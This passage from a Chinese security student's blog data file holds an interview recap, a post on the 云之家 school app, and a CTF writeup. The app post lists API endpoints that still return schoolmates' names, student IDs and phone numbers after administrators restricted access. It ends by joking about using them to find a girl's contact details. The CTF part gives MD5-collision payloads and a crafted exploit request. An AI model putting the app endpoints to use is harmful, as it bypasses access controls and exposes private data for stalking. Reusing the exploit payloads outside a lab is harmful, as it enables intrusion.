电话接通</h2><p><strong>我看你简历写得很简单，你再来一个自我介绍吧</strong></p>\n<p>大一ACM，大二学渗透（未实践），大三CTF</p>\n<p><strong>大一的ACM有获奖吗，给你带来了什么</strong></p>\n<p>没有参加大型比赛，学会了基础算法，现在熟悉python</p>\n<p><strong>渗透和大三搞的是不是一个东西</strong></p>\n<p>balabala</p>\n<p><strong>现在最拿手的是什么</strong></p>\n<p>sql注入</p>\n<p><strong>sql注入原理</strong></p>\n<p>balabala</p>\n<p><strong>有了解过命令执行漏洞和反弹shell吗，怎么产生</strong></p>\n<p>balabala</p>\n<p><strong>木马变形会吗？还是一句话木马就够用了</strong></p>\n<p>一句话木马就基本够用,有些还要绕过禁用函数</p>\n<p><strong>比如如何绕过</strong></p>\n<p>balabal</p>\n<p><strong>举两个例子经典入侵case</strong></p>\n<p>端口扫描，查漏洞，重点关注80，443端口</p>\n<p><strong>有遇到过难绕过的点吗</strong></p>\n<p>说了一个ctf题目</p>\n<p><strong>ctf能力在学校的排名</strong></p>\n<p>balabala</p>\n<p><strong>为什么搞安全</strong></p>\n<p>说了自己的一个经历</p>\n<p><strong>还有什么要问的</strong></p>\n<h2 id=\"0x05-等待结果\"><a href=\"#0x05-等待结果\" class=\"headerlink\" title=\"0x05 等待结果\"></a>0x05 等待结果</h2><p>自我感觉可能凉了</p>"},{"title":"关于云之家的分析","date":"2020-02-25T12:50:19.000Z","encrypt":"enable","enc_pwd":"36402e6b88d5fbf427d3c373e5233066","_content":"\n# 0x00 起因\n\n今天学校开始使用云之家app上报健康数据，云之家有一个同事圈，类似于微信的朋友圈，不过是实名的！！！点击头像就可以知道手机号码、宿舍号码、班级。然后就有一大群校友在发qq空间说\n\n![](/pic/113.jpg)\n\n<!--more-->\n\n![](/pic/118.jpg)\n\n我也去试了一下发现还真的是。\n\n# 0x01 经过\n\n不过呢，好景不长，过了一会就被管理员设置权限了，只能看见本班同学的信息，或者是在同事圈里发了信息的校友姓名。\n\n好在管理员设置的时候笔者抓了一下包\n\n通过通讯录查询校友和老师的接口是\n\n`/openaccess/contacts/getPartHidePersonInfo`\n\n需要post数据（被查询者的）ids和token，返回json\n\n![](/pic/119.png)\n\n```\n{\"success\":true,\"error\":null,\"errorCode\":100,\"data\":[{\"eid\":\"118****\",\"gender\":\"1\",\"openId\":\"5e5479e8e4b00655********\",\"jobTitle\":\"同事\",\"permission\":1,\"oId\":\"5e549d3ee4b00655bff9f****\",\"tid\":\"1183****\",\"orgInfoId\":\"59ed550be4b04eb8c4*****\",\"wbUserId\":\"5e5479e8e4b00655bff1****\",\"uid\":\"126227448\",\"photoUrl\":\"http://static.****.com/****/load?id=5e547a0c90144e595967****\",\"name\":\"艾**\",\"id\":\"5e549d3de4b00655bff9****\",\"status\":3}]}\n```\n\n![](/pic/122.png)\n\n上面是还没有设置权限的结果，下面是设置权限后的结果,设置前没有截图，所以就没有图了。\n\n什么都没有了，只有ID什么什么的\n\n开启抓包模式后一路乱点。\n\n发现了一个接口\n\n`/openaccess/user/getPersonsByOids `\n\n需要post的数据是（被查询者的）oids和token\n\n返回的数据里面除了宿舍号码，其他都有\n\n问题的需要知道别人的oid，通讯录被设置权限以后搜索不到了\n\n经过测试以后可以使用同事圈的搜索\n\n![](/pic/120.png)\n\n抓包发现接口是同事圈域名的`/thirdapp/tribe/searchContacts?offset=0&criteria=中文的url编码`接口get型，返回的数据直接包含电话号码\n\n![](/pic/121.png)\n\n还发现了一个GET类型接口同事圈域名的`/thirdapp/tribe/getUserOpenId?userId=`也能获取数据，不过没有学号。\n\n# 0x02 结束\n\n以后想要通过姓名查询学号，手机号码有地方了嘿嘿。比如说想追的妹子。hhhhh","source":"_posts/关于云之家的分析.md","raw":"---\ntitle: 关于云之家的分析\ndate: 2020-02-25 20:50:19\ntags:\nencrypt: enable\nenc_pwd: 36402e6b88d5fbf427d3c373e5233066\n---\n\n# 0x00 起因\n\n今天学校开始使用云之家app上报健康数据，云之家有一个同事圈，类似于微信的朋友圈，不过是实名的！！！点击头像就可以知道手机号码、宿舍号码、班级。然后就有一大群校友在发qq空间说\n\n![](/pic/113.jpg)\n\n<!--more-->\n\n![](/pic/118.jpg)\n\n我也去试了一下发现还真的是。\n\n# 0x01 经过\n\n不过呢，好景不长，过了一会就被管理员设置权限了，只能看见本班同学的信息，或者是在同事圈里发了信息的校友姓名。\n\n好在管理员设置的时候笔者抓了一下包\n\n通过通讯录查询校友和老师的接口是\n\n`/openaccess/contacts/getPartHidePersonInfo`\n\n需要post数据（被查询者的）ids和token，返回json\n\n![](/pic/119.png)\n\n```\n{\"success\":true,\"error\":null,\"errorCode\":100,\"data\":[{\"eid\":\"118****\",\"gender\":\"1\",\"openId\":\"5e5479e8e4b00655********\",\"jobTitle\":\"同事\",\"permission\":1,\"oId\":\"5e549d3ee4b00655bff9f****\",\"tid\":\"1183****\",\"orgInfoId\":\"59ed550be4b04eb8c4*****\",\"wbUserId\":\"5e5479e8e4b00655bff1****\",\"uid\":\"126227448\",\"photoUrl\":\"http://static.****.com/****/load?id=5e547a0c90144e595967****\",\"name\":\"艾**\",\"id\":\"5e549d3de4b00655bff9****\",\"status\":3}]}\n```\n\n![](/pic/122.png)\n\n上面是还没有设置权限的结果，下面是设置权限后的结果,设置前没有截图，所以就没有图了。\n\n什么都没有了，只有ID什么什么的\n\n开启抓包模式后一路乱点。\n\n发现了一个接口\n\n`/openaccess/user/getPersonsByOids `\n\n需要post的数据是（被查询者的）oids和token\n\n返回的数据里面除了宿舍号码，其他都有\n\n问题的需要知道别人的oid，通讯录被设置权限以后搜索不到了\n\n经过测试以后可以使用同事圈的搜索\n\n![](/pic/120.png)\n\n抓包发现接口是同事圈域名的`/thirdapp/tribe/searchContacts?offset=0&criteria=中文的url编码`接口get型，返回的数据直接包含电话号码\n\n![](/pic/121.png)\n\n还发现了一个GET类型接口同事圈域名的`/thirdapp/tribe/getUserOpenId?userId=`也能获取数据，不过没有学号。\n\n# 0x02 结束\n\n以后想要通过姓名查询学号，手机号码有地方了嘿嘿。比如说想追的妹子。hhhhh","slug":"关于云之家的分析","published":1,"updated":"2020-02-25T12:50:19.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfnp001wpk7e4q9cbr92","content":"<script src=/js/crypto-js.js></script>\n<script>\nfunction doDecrypt (pwd, onError) {\n\tconsole.log('in doDecrypt');\n\tconst txt = document.getElementById('enc_content').innerHTML;\n\tlet plantext;\n\ttry {\n\t\tconst bytes = CryptoJS.AES.decrypt(txt, pwd);\n\t\tvar plaintext = bytes.toString(CryptoJS.enc.Utf8);\n\t} catch(err) {\n\t\tif(onError) {\n\t\t\tonError(err);\n\t\t}\n\t\treturn;\n\t}\n\tdocument.getElementById('enc_content').innerHTML = plaintext;\n\tdocument.getElementById('enc_content').style.display = 'block';\n\tdocument.getElementById('enc_passwd').style.display = 'none';\n\tif(typeof MathJax !== 'undefined') {\n\t\tMathJax.Hub.Queue(\n\t\t\t['resetEquationNumbers', MathJax.InputJax.TeX],\n\t\t\t['PreProcess', MathJax.Hub],\n\t\t\t['Reprocess', MathJax.Hub]\n\t\t);\n\t}\n}\n</script>\n<div id=\"enc_content\" style=\"display:none\">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</div>\n<div id=\"enc_passwd\"> <input id=\"enc_pwd_input\" type=\"password\" style=\"border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;\" onkeydown=\"if (event.keyCode == 13) { decrypt(); return false;}\"> <input type=\"submit\" value=\"解&nbsp;密\" onclick=\"decrypt()\" style=\"width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;\"><div id=\"enc_error\" style=\"display: inline-block;color: #d84527;margin-left: 10px\"></div>\n<script>\nvar onError = function(error) {\n\tdocument.getElementById(\"enc_error\").innerHTML = \"password error!\"\n};\nfunction decrypt() {\nvar passwd = document.getElementById(\"enc_pwd_input\").value;\nconsole.log(passwd);\ndoDecrypt(passwd, onError);\n}\n</script>\n</div>","site":{"data":{}},"excerpt":"<h1 id=\"0x00-起因\"><a href=\"#0x00-起因\" class=\"headerlink\" title=\"0x00 起因\"></a>0x00 起因</h1><p>今天学校开始使用云之家app上报健康数据，云之家有一个同事圈，类似于微信的朋友圈，不过是实名的！！！点击头像就可以知道手机号码、宿舍号码、班级。然后就有一大群校友在发qq空间说</p>\n<p><img src=\"/pic/113.jpg\" alt=\"\"></p>","more":"<p><img src=\"/pic/118.jpg\" alt=\"\"></p>\n<p>我也去试了一下发现还真的是。</p>\n<h1 id=\"0x01-经过\"><a href=\"#0x01-经过\" class=\"headerlink\" title=\"0x01 经过\"></a>0x01 经过</h1><p>不过呢，好景不长，过了一会就被管理员设置权限了，只能看见本班同学的信息，或者是在同事圈里发了信息的校友姓名。</p>\n<p>好在管理员设置的时候笔者抓了一下包</p>\n<p>通过通讯录查询校友和老师的接口是</p>\n<p><code>/openaccess/contacts/getPartHidePersonInfo</code></p>\n<p>需要post数据（被查询者的）ids和token，返回json</p>\n<p><img src=\"/pic/119.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;success&quot;:true,&quot;error&quot;:null,&quot;errorCode&quot;:100,&quot;data&quot;:[&#123;&quot;eid&quot;:&quot;118****&quot;,&quot;gender&quot;:&quot;1&quot;,&quot;openId&quot;:&quot;5e5479e8e4b00655********&quot;,&quot;jobTitle&quot;:&quot;同事&quot;,&quot;permission&quot;:1,&quot;oId&quot;:&quot;5e549d3ee4b00655bff9f****&quot;,&quot;tid&quot;:&quot;1183****&quot;,&quot;orgInfoId&quot;:&quot;59ed550be4b04eb8c4*****&quot;,&quot;wbUserId&quot;:&quot;5e5479e8e4b00655bff1****&quot;,&quot;uid&quot;:&quot;126227448&quot;,&quot;photoUrl&quot;:&quot;http:&#x2F;&#x2F;static.****.com&#x2F;****&#x2F;load?id&#x3D;5e547a0c90144e595967****&quot;,&quot;name&quot;:&quot;艾**&quot;,&quot;id&quot;:&quot;5e549d3de4b00655bff9****&quot;,&quot;status&quot;:3&#125;]&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/122.png\" alt=\"\"></p>\n<p>上面是还没有设置权限的结果，下面是设置权限后的结果,设置前没有截图，所以就没有图了。</p>\n<p>什么都没有了，只有ID什么什么的</p>\n<p>开启抓包模式后一路乱点。</p>\n<p>发现了一个接口</p>\n<p><code>/openaccess/user/getPersonsByOids</code></p>\n<p>需要post的数据是（被查询者的）oids和token</p>\n<p>返回的数据里面除了宿舍号码，其他都有</p>\n<p>问题的需要知道别人的oid，通讯录被设置权限以后搜索不到了</p>\n<p>经过测试以后可以使用同事圈的搜索</p>\n<p><img src=\"/pic/120.png\" alt=\"\"></p>\n<p>抓包发现接口是同事圈域名的<code>/thirdapp/tribe/searchContacts?offset=0&amp;criteria=中文的url编码</code>接口get型，返回的数据直接包含电话号码</p>\n<p><img src=\"/pic/121.png\" alt=\"\"></p>\n<p>还发现了一个GET类型接口同事圈域名的<code>/thirdapp/tribe/getUserOpenId?userId=</code>也能获取数据，不过没有学号。</p>\n<h1 id=\"0x02-结束\"><a href=\"#0x02-结束\" class=\"headerlink\" title=\"0x02 结束\"></a>0x02 结束</h1><p>以后想要通过姓名查询学号，手机号码有地方了嘿嘿。比如说想追的妹子。hhhhh</p>"},{"title":"安恒月赛20200226","date":"2020-02-26T05:49:48.000Z","_content":"\n# easy-hash\n\n打开题目就是源码\n\n<!--more-->\n\n```\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$val1 = @$_GET['val1'];\n$val2 = @$_GET['val2'];\n$val3 = @$_GET['val3'];\n$val4 = @$_GET['val4'];\n$val5 = (string)@$_POST['val5'];\n$val6 = (string)@$_POST['val6'];\n$val7 = (string)@$_POST['val7'];\nif( $val1 == $val2 ){\n    die('val1 OR val2 no no no');\n}\nif( md5($val1) != md5($val2) ){\n    die('step 1 fail');\n}\nif( $val3 == $val4 ){\n    die('val3 OR val4 no no no');\n}\nif ( md5($val3) !== md5($val4)){\n    die('step 2 fail');\n}\nif( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 ){\n    die('val5 OR val6 OR val7 no no no');\n}\nif (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7)){\n    die('step 3 fail');\n}\n\nif(!($_POST['a']) and !($_POST['b']))\n{\n    echo \"come on!\";\n    die();\n}\n$a = $_POST['a'];\n$b = $_POST['b'];\n$m = $_GET['m'];\n$n = $_GET['n'];\n\nif (!(ctype_alnum($a)) || (strlen($a) > 5)  || !(ctype_alnum($b)) || (strlen($b) > 6))    ////判断是否是字母和数字或字母数字的组合\n{\n    echo \"a OR b fail!\";\n    die();\n}\n\nif ((strlen($m) > 1) || (strlen($n) > 1))\n{\n    echo \"m OR n fail\";\n    die();\n}\n\n$val8 = md5($a);\n$val9 = strtr(md5($b), $m, $n);  //将MD5后包含$m的内容替换为$n\n\necho PHP_EOL;\necho \"<p>val8 : $val8</p>\";\necho PHP_EOL;\necho \"<p>val9 : $val9</p>\";\necho PHP_EOL;\nif (($val8 == $val9) && !($a === $b) && (strlen($b) === 5))\n{\n    echo \"nice,good job,give you flag:\";\n    echo file_get_contents('/var/www/html/flag.php');\n} val1 OR val2 no no no\n```\n\n显然的MD5碰撞\n\n生成的四组不同字符相同MD5\n\n```\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A\n\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A\n\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A\n\n%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A\n```\n\n发包\n\n```\nPOST /?val1=s878926199a&val2=s155964671a&val3=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&val4=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&m=a&n=1 HTTP/1.1\nHost: 183.129.189.60:10004\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 2337\nOrigin: http://183.129.189.60:10004\nConnection: close\nReferer: 